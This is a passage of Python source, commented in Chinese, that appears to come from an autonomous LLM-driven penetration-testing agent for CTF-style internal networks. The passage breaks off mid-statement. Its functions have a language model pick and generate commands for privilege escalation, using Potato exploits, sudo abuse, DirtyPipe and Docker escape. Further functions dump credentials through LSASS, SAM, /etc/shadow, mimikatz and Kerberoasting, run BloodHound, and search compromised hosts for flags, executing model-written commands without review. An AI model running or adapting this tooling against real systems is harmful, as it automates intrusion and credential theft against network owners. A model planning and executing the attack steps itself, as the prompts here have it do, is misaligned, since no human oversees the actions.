    logger.info(f"AI分析 {target} ({os_type}) 的提权路径...")

    # 已有管理员权限，直接凭据转储
    if is_admin:
        logger.info(f"已有管理员权限，执行凭据转储")
        return _ai_credential_dump(state, session, active_sessions, credentials, shell_session)

    # AI决策提权策略（包含备选方法）
    priv_strategy = _ai_decide_privesc_strategy(target, os_type, session, state)
    logger.info(f"AI决策: {priv_strategy.get('method')} - {priv_strategy.get('reason', '')}")

    # 执行提权（支持自动切换）
    result = _execute_privesc_with_fallback(state, shell_session, priv_strategy, os_type, session)

    if result.get("success"):
        logger.info(f"提权成功！方法: {result.get('method_used', priv_strategy.get('method'))}")
        session["is_admin"] = True
        session["is_system"] = result.get("is_system", False)
        return _ai_credential_dump(state, session, active_sessions, credentials, shell_session)

    # 所有方法都失败
    logger.warning(f"提权失败: {result.get('error', '')}，已尝试 {result.get('attempts', 0)} 种方法")
    return {
        "error": result.get("error", "所有提权方法失败"),
        "privesc_attempts": result.get("attempted_methods", []),
        "failure_weighted_score": state.get("failure_weighted_score", 0) + 1.0,
        "active_sessions": active_sessions
    }



def _ai_decide_privesc_strategy(target: str, os_type: str, session: Dict, state: Dict) -> Dict:
    """AI决策提权策略 - 智能环境感知，支持失败自动切换"""
    is_admin = session.get("is_admin", False)
    shell_session = state.get("shell_session", {})
    session_id = shell_session.get("session_id", "")

    # 收集详细环境信息
    env_info = _collect_privesc_env_info(session_id, os_type)

    # 基于环境信息智能生成提权方法列表
    if os_type == "windows":
        methods = _get_windows_privesc_methods(env_info)
    else:
        methods = _get_linux_privesc_methods(env_info)

    # 获取阶段信息和战略上下文
    stage_info = state.get("stage_info", {})
    strategic_context = state.get("strategic_context", {})
    stage_section = _build_stage_section(stage_info) if PROMPTS_AVAILABLE else ""
    strategic_section = _build_strategic_section(strategic_context) if PROMPTS_AVAILABLE else ""

    # AI决策最优方法
    prompt = f"""分析目标系统，决策最佳提权策略。
{stage_section}{strategic_section}
目标: {target}, 系统: {os_type}, 权限: {'管理员' if is_admin else '普通用户'}
环境: {json.dumps(env_info, ensure_ascii=False)}
可用方法: {json.dumps(methods[:6], ensure_ascii=False)}

输出JSON: {"method": "方法名", "commands": ["命令"], "reason": "理由", "fallback_methods": ["备选1","备选2"], "on_failure": "switch"}
"""
    try:
        response = llm_client.call_chat_completion(model=config.ANALYST_MODEL, messages=[{"role": "user", "content": prompt}], temperature=0.1, json_mode=True)
        if "```json" in response: response = response.split("```json")[1].split("```")[0]
        result = json.loads(response.strip())
        result["all_methods"] = methods
        return result
    except Exception as e:
        logger.warning(f"AI决策失败: {e}")
        return _fallback_privesc_strategy(os_type, env_info, methods)


def _collect_privesc_env_info(session_id: str, os_type: str) -> Dict:
    """收集提权所需的环境信息"""
    env_info = {}
    if not session_id or not REMOTE_EXEC_AVAILABLE: return {"error": "无会话"}
    session_manager = get_session_manager()
    session = session_manager.get_session(session_id)
    if not session: return {"error": "会话不存在"}

    probes = {"windows": {"privileges": "whoami /priv", "os_version": "systeminfo | findstr OS", "services": "sc query"},
              "linux": {"kernel": "uname -a", "sudo_config": "sudo -l 2>/dev/null", "suid": "find / -perm -4000 2>/dev/null | head -20", "docker": "id; ls /var/run/docker.sock 2>/dev/null"}}
    for name, cmd in probes.get(os_type, probes["linux"]).items():
        try:
            r = execute_on_session(session, cmd, timeout=15)
            if r.success: env_info[name] = r.output[:500]
        except Exception as e:
            logger.warning(f"[collect_privesc_env] 探测命令 {name} 失败: {e}")
            # 集成错误纠正
            try:
                if self_correction_manager:
                    self_correction_manager.record_error(
                        node="collect_privesc_env",
                        error_type="execution",
                        error_message=str(e),
                        severity=ErrorSeverity.MEDIUM if ErrorSeverity else "medium"
                    )
            except:
                pass
    return env_info


def _get_windows_privesc_methods(env_info: Dict) -> List[Dict]:
    """Windows提权方法列表"""
    methods = []
    privs = env_info.get("privileges", "")
    os_v = env_info.get("os_version", "")
    if "SeImpersonatePrivilege" in privs:
        if "10" in os_v or "2016" in os_v:
            methods = [{"name": "GodPotato", "confidence": 0.95}, {"name": "PrintSpoofer", "confidence": 0.90}, {"name": "SweetPotato", "confidence": 0.85}, {"name": "BadPotato", "confidence": 0.80}]
        else:
            methods = [{"name": "JuicyPotato", "confidence": 0.90}, {"name": "RoguePotato", "confidence": 0.80}]
    if env_info.get("services"): methods.append({"name": "ServiceConfig", "confidence": 0.70})
    methods.sort(key=lambda m: m["confidence"], reverse=True)
    return methods


def _get_linux_privesc_methods(env_info: Dict) -> List[Dict]:
    """Linux提权方法列表 - GTFOBins全覆盖"""
    methods = []
    sudo_cfg = env_info.get("sudo_config", "")
    if sudo_cfg and ("(root)" in sudo_cfg or "NOPASSWD" in sudo_cfg):
        for tool in ["mysql", "vim", "less", "find", "python", "bash", "awk", "tar", "git", "perl", "nmap", "man", "cp"]:
            if tool in sudo_cfg.lower():
                methods.append({"name": f"Sudo{tool.capitalize()}", "confidence": 0.95})
    if "docker" in env_info.get("docker", ""): methods.append({"name": "DockerEscape", "confidence": 0.90})
    if env_info.get("suid"): methods.append({"name": "SUID", "confidence": 0.80})
    if "cap_setuid" in env_info.get("capabilities", ""): methods.append({"name": "CapSetuid", "confidence": 0.85})
    methods.extend([{"name": "DirtyPipe", "confidence": 0.85}, {"name": "DirtyCow", "confidence": 0.80}])
    methods.sort(key=lambda m: m["confidence"], reverse=True)
    return methods


def _fallback_privesc_strategy(os_type: str, env_info: Dict, methods: List[Dict]) -> Dict:
    """智能降级策略"""
    if methods:
        best = methods[0]
        return {"method": best["name"], "commands": [], "reason": f"降级:{best['confidence']}", "fallback_methods": [m["name"] for m in methods[1:4]], "all_methods": methods, "on_failure": "switch"}
    return {"method": "PrintSpoofer" if os_type=="windows" else "SUID", "commands": [], "reason": "默认", "on_failure": "switch"}



def _execute_privesc_with_fallback(state: Dict, shell_session: Dict, strategy: Dict, os_type: str, session: Dict) -> Dict:
    """执行提权 - 支持失败后自动切换备选方法"""
    attempted_methods = []
    all_methods = strategy.get("all_methods", [])
    fallbacks = strategy.get("fallback_methods", [])
    methods_to_try = [strategy.get("method")] + fallbacks

    for method_name in methods_to_try[:5]:  # 最多尝试5种方法
        if not method_name: continue
        logger.info(f"尝试提权方法: {method_name}")

        # 获取方法配置
        method_config = next((m for m in all_methods if m["name"] == method_name), None)
        if not method_config:
            method_config = {"name": method_name, "cmd": ""}

        # 执行提权
        result = _try_single_privesc_method(state, shell_session, method_config, os_type, session)
        attempted_methods.append({"method": method_name, "success": result.get("success"), "error": result.get("error", "")})

        if result.get("success"):
            return {"success": True, "method_used": method_name, "is_system": result.get("is_system"), "attempts": len(attempted_methods), "attempted_methods": attempted_methods}

        logger.warning(f"{method_name} 失败: {result.get('error')}")

    return {"success": False, "error": "所有方法失败", "attempts": len(attempted_methods), "attempted_methods": attempted_methods}


def _try_single_privesc_method(state: Dict, shell_session: Dict, method: Dict, os_type: str, session: Dict) -> Dict:
    """尝试单个提权方法"""
    if shell_session.get("session_id") and REMOTE_EXEC_AVAILABLE:
        return _execute_privesc_via_session(shell_session, {"commands": [method.get("cmd", "")], "method": method["name"]}, os_type)
    elif ADVANCED_OPS_AVAILABLE:
        result = PrivilegeEscalation.attempt_escalation(session, method["name"])
        return {"success": result.status == OperationStatus.SUCCESS, "is_system": result.status == OperationStatus.SUCCESS, "error": result.message if result.status != OperationStatus.SUCCESS else ""}
    return {"success": False, "error": "无可用执行模块"}



def _execute_privesc_advanced(session: Dict, strategy: Dict) -> Dict:
    """使用高级操作模块执行提权"""
    if not ADVANCED_OPS_AVAILABLE:
        return {"success": False, "error": "高级操作模块不可用"}

    method = strategy.get("method", "")
    result = PrivilegeEscalation.attempt_escalation(session, method)

    return {
        "success": result.status == OperationStatus.SUCCESS,
        "is_system": result.status == OperationStatus.SUCCESS,
        "error": result.message if result.status != OperationStatus.SUCCESS else ""
    }


def _ai_credential_dump(state: Dict, session: Dict,
                        active_sessions: List, credentials: List,
                        shell_session: Dict) -> Dict:
    """AI驱动的凭据转储"""
    new_credentials = list(credentials)
    target = session.get("host", "")
    os_type = session.get("os_type", shell_session.get("os_type", "linux"))

    logger.info(f"AI决策凭据收集策略...")

    # AI决策凭据收集方法
    prompt = f"""
决策凭据收集策略。

## 目标
- IP: {target}
- 系统: {os_type}
- 权限: 管理员

## 可用方法
{os_type == "windows" and "mimikatz, LSASS转储, SAM转储, DCSync" or "/etc/shadow, SSH密钥, 历史命令, 配置文件"}

## 输出格式 (JSON)
{{
    "methods": ["方法列表，按优先级"],
    "commands": ["命令列表"]
}}
"""

    try:
        response = llm_client.call_chat_completion(
            model=config.ANALYST_MODEL,
            messages=[{"role": "user", "content": prompt}],
            temperature=0.1,
            json_mode=True
        )

        if "```json" in response:
            response = response.split("```json")[1].split("```")[0]

        strategy = json.loads(response.strip())
        logger.info(f"AI选择: {', '.join(strategy.get('methods', []))}")

    except Exception:
        strategy = {"methods": ["默认"], "commands": []}

    # 执行凭据收集
    if shell_session.get("session_id") and REMOTE_EXEC_AVAILABLE:
        session_manager = get_session_manager()
        exec_session = session_manager.get_session(shell_session["session_id"])

        if exec_session:
            # 检查会话健康状态
            health = session_manager.check_session_health(shell_session["session_id"])
            if not health.get("alive"):
                logger.warning(f"会话已断开: {health.get('status')}")
            else:
                for cmd in strategy.get("commands", []):
                    try:
                        result = execute_on_session(exec_session, cmd, timeout=60)
                        if result.success:
                            # 解析凭据
                            parsed = _parse_credentials_from_output(result.output, os_type, target)
                            new_credentials.extend(parsed)
                    except Exception as e:
                        logger.warning(f"[ai_credential_dump] 凭据收集命令失败: {e}")
                        # 集成错误纠正
                        try:
                            if self_correction_manager:
                                self_correction_manager.record_error(
                                    node="ai_credential_dump",
                                    error_type="execution",
                                    error_message=str(e),
                                    severity=ErrorSeverity.MEDIUM if ErrorSeverity else "medium"
                                )
                        except:
                            pass

    # 使用高级模块作为备选
    if ADVANCED_OPS_AVAILABLE and not new_credentials:
        try:
            if os_type == "windows":
                result = CredentialDumper.dump_lsass(session)
                if result.status == OperationStatus.SUCCESS:
                    logger.info(f"LSASS转储成功")
            else:
                result = CredentialDumper.dump_linux_hashes(session)
                if result.status == OperationStatus.SUCCESS:
                    hashes = result.data.get("hashes", [])
                    for h in hashes:
                        new_credentials.append({
                            "host": target,
                            "username": h.get("username"),
                            "hash": h.get("hash"),
                            "cred_type": "password_hash"
                        })
        except Exception as e:
            logger.warning(f"失败: {e}")

    return {
        "active_sessions": active_sessions,
        "credentials": new_credentials if len(new_credentials) > len(credentials) else credentials,
        "execution_steps": state.get("execution_steps", 0) + 1
    }


def _parse_credentials_from_output(output: str, os_type: str, host: str = "") -> List[Dict]:
    """从命令输出解析凭据，并自动存储到CredentialManager"""
    import re
    credentials = []

    # Windows凭据模式
    if os_type == "windows":
        # NTLM哈希
        ntlm_pattern = r"(\w+)::[\w]+:([a-f0-9]+):([a-f0-9]+)"
        for match in re.finditer(ntlm_pattern, output, re.IGNORECASE):
            cred = {
                "username": match.group(1),
                "hash": f"{match.group(2)}:{match.group(3)}",
                "cred_type": "ntlm",
                "host": host
            }
            credentials.append(cred)
    else:
        # Linux shadow文件
        hash_pattern = r"(\w+):(\$[\w$\.\/]+)"
        for match in re.finditer(hash_pattern, output):
            cred = {
                "username": match.group(1),
                "hash": match.group(2),
                "cred_type": "password_hash",
                "host": host
            }
            credentials.append(cred)

    # 自动存储凭据到CredentialManager
    if credentials and CREDENTIAL_INTEGRATION_AVAILABLE:
        store_credentials_to_manager(credentials, source="output_parse")

    return credentials


def _attempt_credential_dump(state: Dict, session: Dict,
                              active_sessions: List, credentials: List) -> Dict:
    """尝试凭据转储"""
    new_credentials = list(credentials)

    try:
        if session.get("os", "").lower() == "windows":
            # 尝试LSASS转储
            result = CredentialDumper.dump_lsass(session)
            if result.status == OperationStatus.SUCCESS:
                logger.info(f"LSASS转储成功")
                # 解析获取的凭据（这里简化处理）
                # 实际应该解析result.data中的凭据

            # 尝试SAM转储
            result = CredentialDumper.dump_sam_system(session)
            if result.status in [OperationStatus.SUCCESS, OperationStatus.PARTIAL]:
                logger.info(f"SAM/SYSTEM转储成功")
        else:
            # Linux 凭据转储
            result = CredentialDumper.dump_linux_hashes(session)
            if result.status == OperationStatus.SUCCESS:
                logger.info(f"获取到Linux密码哈希")
                hashes = result.data.get("hashes", [])
                for h in hashes:
                    new_credentials.append({
                        "host": session.get("host"),
                        "username": h.get("username"),
                        "hash": h.get("hash"),
                        "cred_type": "password_hash"
                    })

    except Exception as e:
        logger.warning(f"凭据转储失败: {e}")

    return {
        "active_sessions": active_sessions,
        "credentials": new_credentials if len(new_credentials) > len(credentials) else credentials,
        "execution_steps": state.get("execution_steps", 0) + 1
    }


def credential_gather_node(state: Dict) -> Dict:
    """
    [凭据收集节点] AI驱动的凭据收集

    输入:
        - current_internal_target: 当前目标
        - internal_hosts: 已发现的主机
        - proxy_info: 代理信息
        - shell_session: 会话信息

    输出:
        - credentials: 收集到的凭据

    AI决策:
        1. 分析目标服务选择收集方法
        2. 决定是否需要使用代理
        3. 处理收集结果
    """
    target = state.get("current_internal_target", "")
    internal_hosts = state.get("internal_hosts") or []
    proxy_info = state.get("proxy_info", {})
    shell_session = state.get("shell_session", {})

    if not target:
        return {"error": "没有指定目标"}

    # 获取目标信息
    target_host = next(
        (h for h in internal_hosts if isinstance(h, dict) and h.get("ip") == target),
        None
    )

    if not target_host:
        return {
            "error": f"未找到目标 {target} 的信息",
            "failure_weighted_score": state.get("failure_weighted_score", 0) + 0.5
        }

    ports = target_host.get("ports") or []
    port_numbers = [p.get("port") for p in ports if isinstance(p, dict)]

    credentials = state.get("credentials") or []

    logger.info(f"AI分析 {target} 的凭据收集策略...")

    # AI决策凭据收集策略
    gather_strategy = _ai_decide_cred_gather_strategy(target, target_host, credentials, state)

    logger.info(f"AI决策: {gather_strategy.get('method')} - {gather_strategy.get('reason', '')}")

    new_credentials = []

    # 执行凭据收集
    method = gather_strategy.get("method", "")

    try:
        if method == "smb_anonymous":
            result = _execute_smb_anonymous(target, proxy_info)
            if result.get("success"):
                new_credentials.extend(result.get("credentials", []))

        elif method == "ldap_enum":
            result = _execute_ldap_enum(target, credentials, proxy_info)
            if result.get("success"):
                new_credentials.extend(result.get("credentials", []))

        elif method == "bloodhound":
            result = _execute_bloodhound(target, credentials, proxy_info)
            if result.get("success"):
                new_credentials.extend(result.get("credentials", []))
                return {
                    "credentials": credentials + new_credentials,
                    # analyst_intel已移除，intel信息合并到attack_paths描述中
                    "attack_paths": result.get("attack_paths", []),
                    "execution_steps": state.get("execution_steps", 0) + 1
                }

        elif method == "session_dump":
            if shell_session.get("session_id") and REMOTE_EXEC_AVAILABLE:
                result = _execute_session_cred_dump(shell_session)
                new_credentials.extend(result.get("credentials", []))

        elif method == "kerberoast":
            result = _execute_kerberoast(target, credentials, proxy_info)
            if result.get("success"):
                new_credentials.extend(result.get("credentials", []))

    except Exception as e:
        logger.warning(f"执行失败: {e}")

    if new_credentials:
        logger.info(f"收集到 {len(new_credentials)} 条凭据")
    else:
        logger.info(f"未收集到新凭据")

    return {
        "credentials": credentials + new_credentials,
        "current_internal_target": target,
        "execution_steps": state.get("execution_steps", 0) + 1
    }


def _ai_decide_cred_gather_strategy(target: str, target_host: Dict, credentials: List, state: Dict) -> Dict:
    """
    AI决策凭据收集策略
    集成阶段感知和战略上下文
    """
    ports = target_host.get("ports") or []
    port_numbers = [p.get("port") for p in ports if isinstance(p, dict)]

    # 压缩凭据信息
    has_domain_creds = any(c.get("domain") for c in credentials)
    creds_count = len(credentials)

    # 获取阶段信息和战略上下文
    stage_info = state.get("stage_info", {})
    strategic_context = state.get("strategic_context", {})
    stage_section = _build_stage_section(stage_info) if PROMPTS_AVAILABLE else ""
    strategic_section = _build_strategic_section(strategic_context) if PROMPTS_AVAILABLE else ""

    prompt = f"""
分析目标，决策最佳凭据收集策略。
{stage_section}{strategic_section}
## 目标信息
- IP: {target}
- 开放端口: {port_numbers}
- 已有凭据: {creds_count} 条
- 有域凭据: {'是' if has_domain_creds else '否'}

## 可用方法
- smb_anonymous: SMB匿名登录，无需凭据
- ldap_enum: LDAP枚举，需要域凭据
- bloodhound: BloodHound分析，需要域凭据
- session_dump: 会话凭据转储，需要有shell
- kerberoast: Kerberoasting，需要域凭据

## 输出格式 (JSON)
{{
    "method": "方法名称",
    "reason": "选择理由",
    "priority": "high/medium/low"
}}
"""

    try:
        response = llm_client.call_chat_completion(
            model=config.ANALYST_MODEL,
            messages=[{"role": "user", "content": prompt}],
            temperature=0.1,
            json_mode=True
        )

        if "```json" in response:
            response = response.split("```json")[1].split("```")[0]

        return json.loads(response.strip())

    except Exception as e:
        logger.warning(f"AI决策失败: {e}")
        # 降级: 基于端口选择
        if 445 in port_numbers:
            return {"method": "smb_anonymous", "reason": "SMB开放"}
        elif 389 in port_numbers and has_domain_creds:
            return {"method": "ldap_enum", "reason": "LDAP开放且有域凭据"}
        else:
            return {"method": "session_dump", "reason": "默认"}


def _execute_smb_anonymous(target: str, proxy_info: Dict) -> Dict:
    """执行SMB匿名登录"""
    try:
        result = ToolRegistry.execute_cached(
            "crackmapexec",
            target,
            {
                "target": target,
                "protocol": "smb",
                "action": "shares"
            }
        )

        if result and result.get("result", {}).get("success"):
            shares = result.get("result", {}).get("shares", [])
            return {
                "success": True,
                "credentials": [{"host": target, "type": "smb_anonymous"}]
            }
    except Exception as e:
        logger.warning(f"[execute_smb_anonymous] SMB匿名登录失败: {e}")
        # 集成错误纠正
        try:
            if self_correction_manager:
                self_correction_manager.record_error(
                    node="execute_smb_anonymous",
                    error_type="execution",
                    error_message=str(e),
                    severity=ErrorSeverity.MEDIUM if ErrorSeverity else "medium"
                )
        except:
            pass

    return {"success": False}


def _execute_ldap_enum(target: str, credentials: List, proxy_info: Dict) -> Dict:
    """执行LDAP枚举"""
    # 找一个域凭据
    domain_cred = next((c for c in credentials if c.get("domain")), None)
    if not domain_cred:
        return {"success": False}

    try:
        result = ToolRegistry.execute_cached(
            "bloodhound-python",
            target,
            {
                "domain": domain_cred.get("domain", ""),
                "dc": target,
                "username": domain_cred.get("username", ""),
                "password": domain_cred.get("password", ""),
                "hash": domain_cred.get("hash", "")
            }
        )

        if result and result.get("result", {}).get("success"):
            return {
                "success": True,
                "credentials": result.get("result", {}).get("credentials", [])
            }
    except Exception as e:
        logger.warning(f"[execute_ldap_enum] LDAP枚举失败: {e}")
        # 集成错误纠正
        try:
            if self_correction_manager:
                self_correction_manager.record_error(
                    node="execute_ldap_enum",
                    error_type="execution",
                    error_message=str(e),
                    severity=ErrorSeverity.MEDIUM if ErrorSeverity else "medium"
                )
        except:
            pass

    return {"success": False}


def _execute_bloodhound(target: str, credentials: List, proxy_info: Dict) -> Dict:
    """执行BloodHound数据采集"""
    domain_cred = next((c for c in credentials if c.get("domain")), None)
    if not domain_cred:
        return {"success": False}

    try:
        result = ToolRegistry.execute_cached(
            "bloodhound",
            target,
            {
                "domain": domain_cred.get("domain", ""),
                "dc": target,
                "username": domain_cred.get("username", ""),
                "password": domain_cred.get("password", ""),
                "hash": domain_cred.get("hash", ""),
                "collection": "all"
            }
        )

        if result and result.get("result", {}).get("success"):
            bh_data = result.get("result", {})
            return {
                "success": True,
                "credentials": [],
                "intel": bh_data.get("summary", "BloodHound采集完成"),
                "attack_paths": bh_data.get("attack_paths", [])
            }
    except Exception as e:
        logger.warning(f"[execute_bloodhound] BloodHound数据采集失败: {e}")
        # 集成错误纠正
        try:
            if self_correction_manager:
                self_correction_manager.record_error(
                    node="execute_bloodhound",
                    error_type="execution",
                    error_message=str(e),
                    severity=ErrorSeverity.MEDIUM if ErrorSeverity else "medium"
                )
        except:
            pass

    return {"success": False}


def _execute_session_cred_dump(shell_session: Dict) -> Dict:
    """通过会话执行凭据转储"""
    session_id = shell_session.get("session_id", "")
    os_type = shell_session.get("os_type", "linux")
    host = shell_session.get("target", shell_session.get("host", ""))

    if not session_id:
        return {"credentials": []}

    session_manager = get_session_manager()
    session = session_manager.get_session(session_id)

    if not session:
        return {"credentials": []}

    # 检查会话健康状态
    health = session_manager.check_session_health(session_id)
    if not health.get("alive"):
        return {"credentials": []}

    credentials = []

    # AI生成凭据收集命令
    prompt = f"""
生成凭据收集命令。

## 系统
- 类型: {os_type}

## 要求
输出2-3个命令，用于收集敏感信息或凭据。
格式: JSON数组 ["cmd1", "cmd2"]
"""

    try:
        response = llm_client.call_chat_completion(
            model=config.ANALYST_MODEL,
            messages=[{"role": "user", "content": prompt}],
            temperature=0.1
        )

        if "```json" in response:
            response = response.split("```json")[1].split("```")[0]

        commands = json.loads(response.strip())

        for cmd in commands:
            result = execute_on_session(session, cmd, timeout=30)
            if result.success:
                # 解析凭据
                parsed = _parse_credentials_from_output(result.output, os_type, host)
                credentials.extend(parsed)

    except Exception as e:
        logger.warning(f"[execute_session_cred_dump] 凭据转储失败: {e}")
        # 集成错误纠正
        try:
            if self_correction_manager:
                self_correction_manager.record_error(
                    node="execute_session_cred_dump",
                    error_type="execution",
                    error_message=str(e),
                    severity=ErrorSeverity.MEDIUM if ErrorSeverity else "medium"
                )
        except:
            pass

    return {"credentials": credentials}


def _execute_kerberoast(target: str, credentials: List, proxy_info: Dict) -> Dict:
    """执行Kerberoasting"""
    domain_cred = next((c for c in credentials if c.get("domain")), None)
    if not domain_cred:
        return {"success": False}

    try:
        result = ToolRegistry.execute_cached(
            "impacket",
            target,
            {
                "script": "GetUserSPNs.py",
                "target": f"{domain_cred.get('domain')}/{domain_cred.get('username')}:{domain_cred.get('password')}@{target}"
            }
        )

        if result and result.get("result", {}).get("success"):
            # 解析Kerberoast哈希
            output = result.get("result", {}).get("output", "")
            # 简化: 检查是否有SPN
            if "$krb5tgs$" in output or "SPN" in output:
                return {
                    "success": True,
                    "credentials": [{"type": "kerberoast_hash", "data": output[:500]}]
                }
    except Exception as e:
        logger.warning(f"[execute_kerberoast] Kerberoasting失败: {e}")
        # 集成错误纠正
        try:
            if self_correction_manager:
                self_correction_manager.record_error(
                    node="execute_kerberoast",
                    error_type="execution",
                    error_message=str(e),
                    severity=ErrorSeverity.MEDIUM if ErrorSeverity else "medium"
                )
        except:
            pass

    return {"success": False}


def flag_search_node(state: Dict) -> Dict:
    """
    [Flag搜索节点] 在已攻陷主机的管理员文件夹中搜索Flag

    改进：增加多Flag环境检测和AI完成验证

    输入:
        - active_sessions: 活跃会话
        - compromised_hosts: 已攻陷主机列表
        - shell_session: Shell会话信息

    输出:
        - found_flags: 发现的flag列表
        - compromised_hosts: 更新已攻陷主机

    工作流程:
        1. 遍历所有已攻陷主机
        2. 在管理员文件夹中搜索flag
        3. 收集所有发现的flag
        4. AI验证是否完成（多Flag检测）
        5. 标记主机已完成flag搜索
    """
    active_sessions = state.get("active_sessions") or []
    shell_session = state.get("shell_session", {})
    compromised_hosts = state.get("compromised_hosts") or []
    found_flags = state.get("found_flags") or []
    internal_hosts = state.get("internal_hosts") or []

    # ========== 终止条件1：时间限制检查 ==========
    start_time = state.get("start_time", 0)
    elapsed = time.time() - start_time
    INTERNAL_TASK_TIMEOUT = getattr(config, 'INTERNAL_TASK_TIMEOUT', 3600)  # 默认1小时

    if elapsed > INTERNAL_TASK_TIMEOUT:
        logger.info(f"[FlagSearch] 内网渗透超时 ({elapsed:.0f}秒)，结束搜索")
        return {
            "current_compromise_phase": "complete",
            "execution_steps": state.get("execution_steps", 0) + 1
        }

    if not active_sessions and not shell_session:
        return {
            "error": "没有可用的会话进行Flag搜索",
            "failure_weighted_score": state.get("failure_weighted_score", 0) + 0.5
        }

    logger.info(f"开始在已攻陷主机中搜索Flag...")

    # 收集新发现的flag
    new_flags = []
    newly_compromised = []

    # 获取会话信息
    session_id = shell_session.get("session_id", "")
    os_type = shell_session.get("os_type", "linux")
    current_target = shell_session.get("target", "")

    if REMOTE_EXEC_AVAILABLE and session_id:
        session_manager = get_session_manager()
        session = session_manager.get_session(session_id)

        if session:
            # 检查会话健康状态
            health = session_manager.check_session_health(session_id)
            if health.get("alive"):
                # 在当前主机的管理员文件夹中搜索flag
                flags_found = _search_flags_on_host(session, os_type, current_target)
                new_flags.extend(flags_found)

                if current_target and current_target not in compromised_hosts:
                    newly_compromised.append(current_target)
            else:
                logger.warning(f"主会话已断开: {health.get('status')}")

    # 遍历其他活跃会话
    for sess in active_sessions:
        host = sess.get("host", "")
        sess_os = sess.get("os_type", os_type)

        if host and host in compromised_hosts:
            continue  # 已经搜索过

        # 如果有远程执行能力，尝试搜索
        if REMOTE_EXEC_AVAILABLE and sess.get("session_id"):
            session_manager = get_session_manager()
            remote_session = session_manager.get_session(sess["session_id"])

            if remote_session:
                # 检查会话健康状态
                health = session_manager.check_session_health(sess["session_id"])
                if health.get("alive"):
                    flags_found = _search_flags_on_host(remote_session, sess_os, host)
                    new_flags.extend(flags_found)

                    if host not in compromised_hosts:
                        newly_compromised.append(host)

    # 去重
    new_flags = list(set(new_flags))
    newly_compromised = list(set(newly_compromised))

    if new_flags:
        logger.info(f"发现 {len(new_flags)} 个Flag!")
        for flag in new_flags:
            logger.info(f"   🚩 {flag}")

    # ========== 终止条件2：所有主机攻陷且每台都有flag ==========
    all_compromised = compromised_hosts + newly_compromised
    total_flags = found_flags + new_flags
    unexplored = [h.get("ip") for h in internal_hosts
                  if isinstance(h, dict) and h.get("ip") not in all_compromised]

    # 检查是否所有主机都已攻陷且找到flag
    if len(internal_hosts) > 0 and len(all_compromised) >= len(internal_hosts):
        if len(total_flags) >= len(all_compromised):
            logger.info(f"[FlagSearch] 所有主机已攻陷且每台都有flag，任务完成")
            logger.info(f"任务完成: {len(all_compromised)}台主机攻陷, {len(total_flags)}个flag")
            return {
                "found_flags": new_flags,
                "compromised_hosts": newly_compromised,
                "current_compromise_phase": "complete",
                "execution_steps": state.get("execution_steps", 0) + 1
            }

    # ========== 改进：AI完成验证 ==========
    # 如果所有主机都已攻陷但flag数量不足，进行AI验证

    # 改进：不再简单地根据unexplored判断
    if not unexplored:
        # 验证是否真的完成
        completion = _ai_verify_flag_completion(state, total_flags, all_compromised)

        if completion.get("should_continue"):
            # AI判断还需要继续搜索
            next_phase = "flag_search"  # 继续在已攻陷主机深度搜索
            logger.info(f"AI判断需要继续搜索: {completion.get('reason')}")

            # 执行深度搜索建议的操作
            suggested = completion.get("suggested_actions", [])
            if suggested:
                logger.info(f"建议操作: {suggested[:3]}")
        else:
            next_phase = "complete"
            logger.info(f"AI验证完成，内网渗透结束")
    else:
        next_phase = "lateral_move"
        logger.info(f"还有 {len(unexplored)} 台主机未攻陷，继续横向移动")

    return {
        "found_flags": new_flags,
        "compromised_hosts": newly_compromised,
        "current_compromise_phase": next_phase,
        "execution_steps": state.get("execution_steps", 0) + 1
    }


def _ai_verify_flag_completion(state: Dict, found_flags: List, compromised: List) -> Dict:
    """
    AI验证Flag搜索完成度

    用于多Flag环境检测

    Args:
        state: 当前状态
        found_flags: 已发现的flag列表
        compromised: 已攻陷主机列表

    Returns:
        {
            "should_continue": bool,
            "reason": str,
            "suggested_actions": List[str]
        }
    """
    prompt = f"""
验证Flag搜索是否完成。

## 状态
- 已攻陷主机: {len(compromised)} 台
- 已发现Flag: {len(found_flags)} 个
- 已搜索的目录: 已覆盖管理员文件夹

## 分析
1. Flag数量是否与预期相符（CTF可能每台关键服务器有flag）
2. 是否有遗漏的可能位置（域控、数据库、备份服务器）
3. 是否应该进行深度搜索（注册表、历史命令、数据库）

## 输出格式 (JSON)
{{
    "should_continue": true/false,
    "reason": "理由",
    "suggested_actions": ["建议的下一步行动"],
    "expected_flag_count": 预期flag数量范围
}}
"""

    try:
        response = llm_client.call_chat_completion(
            model=config.ANALYST_MODEL,
            messages=[{"role": "user", "content": prompt}],
            temperature=0.1,
            json_mode=True
        )

        if "```json" in response:
            response = response.split("```json")[1].split("```")[0]

        return json.loads(response.strip())
    except Exception as e:
        logger.warning(f"AI验证失败: {e}")
        # 降级：没flag就继续
        return {
            "should_continue": len(found_flags) == 0,
            "reason": "降级默认：无flag则继续",
            "suggested_actions": []
        }


def _search_flags_on_host(session, os_type: str, host: str) -> List[str]:
    """
    AI驱动的Flag搜索

    让AI分析环境后决定搜索策略，而非硬编码路径
    """
    import re
    from flag_extractor import extract_flags_from_text

    flags = []

    # Step 1: AI收集环境信息
    env_probe_cmds = {
        "windows": [
            ("whoami", "当前用户"),
            ("dir C:\\", "C盘根目录"),
            ("echo %USERPROFILE%", "用户目录"),
            ("set", "环境变量"),
        ],
        "linux": [
            ("whoami", "当前用户"),
            ("ls -la /", "根目录"),
            ("env", "环境变量"),
            ("find /tmp -type f 2>/dev/null | head -20", "临时文件"),
        ]
    }

    env_info = {}
    for cmd, purpose in env_probe_cmds.get(os_type, env_probe_cmds["linux"]):
        try:
            result = execute_on_session(session, cmd, timeout=10)
            if result.success:
                env_info[purpose] = result.output[:500]
        except:
            pass

    # Step 2: AI决定搜索策略
    prompt = f"""分析目标环境，生成flag搜索策略。

目标主机: {host}
系统类型: {os_type}

环境信息:
{json.dumps(env_info, ensure_ascii=False, indent=2)}

生成搜索命令。考虑:
1. 常见CTF flag位置 (/flag, C:\\flag.txt, 桌面, 用户目录)
2. 特殊命名的文件 (flag.txt, flag, key.txt)
3. 环境变量中的flag
4. 隐藏文件
5. 近期修改的文件

输出JSON:
{{
    "search_commands": [
        {{"cmd": "具体命令", "purpose": "搜索目的", "priority": 1-5}}
    ],
    "expected_locations": ["预期flag可能的位置"]
}}"""

    try:
        response = llm_client.call_chat_completion(
            model=config.ANALYST_MODEL,
            messages=[{"role": "user", "content": prompt}],
            temperature=0.2,
            json_mode=True
        )

        if "```json" in response:
            response = response.split("```json")[1].split("```")[0]

        strategy = json.loads(response.strip())
        search_commands = sorted(strategy.get("search_commands", []),
